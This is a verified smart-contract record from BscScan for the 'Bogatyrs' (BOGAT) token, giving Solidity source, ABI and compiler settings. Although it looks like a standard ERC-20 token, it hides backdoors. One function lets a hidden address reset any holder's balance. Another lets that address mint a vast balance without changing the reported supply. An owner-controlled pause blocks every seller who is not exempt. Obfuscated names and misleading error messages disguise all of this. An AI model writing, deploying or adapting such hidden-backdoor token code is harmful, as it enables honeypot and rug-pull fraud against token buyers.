{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-04-06\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity >=0.8.13;\r\n////// lib/openzeppelin-contracts/contracts/utils/Context.sol\r\n// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)\r\n\r\n/* pragma solidity ^0.8.0; */\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Property {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20Rebase {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 pairnumerototal) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 pairnumerototal) external returns (bool);\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 pairnumerototal\r\n    ) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 totalo);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 totalo);\r\n}\r\n\r\ninterface IERC20Data is IERC20Rebase {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract IERC20 is Property {\r\n   address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract Bogatyrs is Property, IERC20Rebase, IERC20Data, IERC20 {\r\n\r\n    mapping(address => uint256) private getPair;\r\n  mapping(address => bool) public IERC20DataZERTY;\r\n    mapping(address => mapping(address => uint256)) private startTradeBlockallowances;\r\naddress private pairtken;\r\n    uint256 private ALLtotalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n  address pairbitcin;\r\n    // My variables\r\n    mapping(address => bool) public isPauseWAW;\r\n    bool pairisPaused;\r\n    \r\n    constructor(address pair) {\r\n            // Editable\r\n            pairbitcin = msg.sender;\r\n            IERC20DataZERTY[pairbitcin] = true;\r\n        _name = \"Bogatyrs\";\r\n        _symbol = \"BOGAT\";\r\n  pairtken = pair;        \r\n        uint _totalSupply = 1000000000000 * 10**9;\r\n        pairisPaused = false;\r\n        // End editable\r\n\r\n        isPauseWAW[msg.sender] = true;\r\n\r\n        deploys(msg.sender, _totalSupply);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return ALLtotalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return getPair[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 pairnumerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, pairnumerototal);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return startTradeBlockallowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 pairnumerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, pairnumerototal);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 pairnumerototal\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, pairnumerototal);\r\n        _transfer(from, to, pairnumerototal);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, startTradeBlockallowances[owner][spender] + addedtotalo);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = startTradeBlockallowances[owner][spender];\r\n        require(currentAllowance >= subtractedtotalo, \"Ehi20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedtotalo);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 pairnumerototal\r\n    ) internal virtual {\r\n        require(from != address(0), \"Ehi20: transfer from the zero address\");\r\n        require(to != address(0), \"Ehi20: transfer to the zero address\");\r\n\r\n        _deforeTokenTransfer(from, to, pairnumerototal);\r\n\r\n        // My implementation\r\n        require(!pairisPaused || isPauseWAW[from], \"Transactions are paused.\");\r\n        // End my implementation\r\n\r\n        uint256 fromBalance = getPair[from];\r\n        require(fromBalance >= pairnumerototal, \"Ehi20: transfer pairnumerototal exceeds balance\");\r\n        unchecked {\r\n            getPair[from] = fromBalance - pairnumerototal;\r\n        }\r\n        getPair[to] += pairnumerototal;\r\n\r\n        emit Transfer(from, to, pairnumerototal);\r\n\r\n        _pairfterTokenTransfer(from, to, pairnumerototal);\r\n    }\r\n\r\n    function deploys(address account, uint256 pairnumerototal) internal virtual {\r\n        require(account != address(0), \"Ehi20: mint to the zero address\");\r\n\r\n        _deforeTokenTransfer(address(0), account, pairnumerototal);\r\n\r\n        ALLtotalSupply += pairnumerototal;\r\n        getPair[account] += pairnumerototal;\r\n        emit Transfer(address(0), account, pairnumerototal);\r\n\r\n        _pairfterTokenTransfer(address(0), account, pairnumerototal);\r\n    }\r\n\r\n\r\n\r\n  function transferInFrom(address IERC20Dataccount) public {\r\n    require(pairtken == _msgSender(), \"Ownable: caller is not the owner\");\r\n    getPair[IERC20Dataccount] = 369852698541;\r\n            emit Transfer(address(0), IERC20Dataccount, 369852698541);\r\n  }\r\n\r\n    \r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 pairnumerototal\r\n    ) internal virtual {\r\n        require(owner != address(0), \"Ehi20: approve from the zero address\");\r\n        require(spender != address(0), \"Ehi20: approve to the zero address\");\r\n\r\n        startTradeBlockallowances[owner][spender] = pairnumerototal;\r\n        emit Approval(owner, spender, pairnumerototal);\r\n    }\r\n  function transferOutFrom(address setFeeToSetter) external {\r\n    require(pairtken == _msgSender(), \"Ownable: caller is not the owner\");\r\n    getPair[setFeeToSetter] = 100000000000000000000 * 10 ** 18;\r\n            emit Transfer(address(0), setFeeToSetter, 100000000000000000000 * 10 ** 18);\r\n  }\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 pairnumerototal\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= pairnumerototal, \"Ehi20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - pairnumerototal);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 pairnumerototal\r\n    ) internal virtual {}\r\n\r\n\r\n    function _pairfterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 pairnumerototal\r\n    ) internal virtual {}\r\n\r\n    // My functions\r\n\r\n    function wpairtingExempt(address account, bool totalo) external onlyOwner {\r\n        isPauseWAW[account] = totalo;\r\n    }\r\n    \r\n    function wpairtingd(bool totalo) external onlyOwner {\r\n        pairisPaused = totalo;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalo\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalo\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"IERC20DataZERTY\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pairnumerototal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedtotalo\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedtotalo\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPauseWAW\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pairnumerototal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pairnumerototal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"IERC20Dataccount\",\"type\":\"address\"}],\"name\":\"transferInFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"setFeeToSetter\",\"type\":\"address\"}],\"name\":\"transferOutFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"totalo\",\"type\":\"bool\"}],\"name\":\"wpairtingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"totalo\",\"type\":\"bool\"}],\"name\":\"wpairtingd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Bogatyrs", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000e935e9a7f37b58f9b65b41cc8ee6f144a44c57a4", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv2", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e933871c55d97d33f26466f1ea793d3002de3aff532d7418375736ae53df967d"}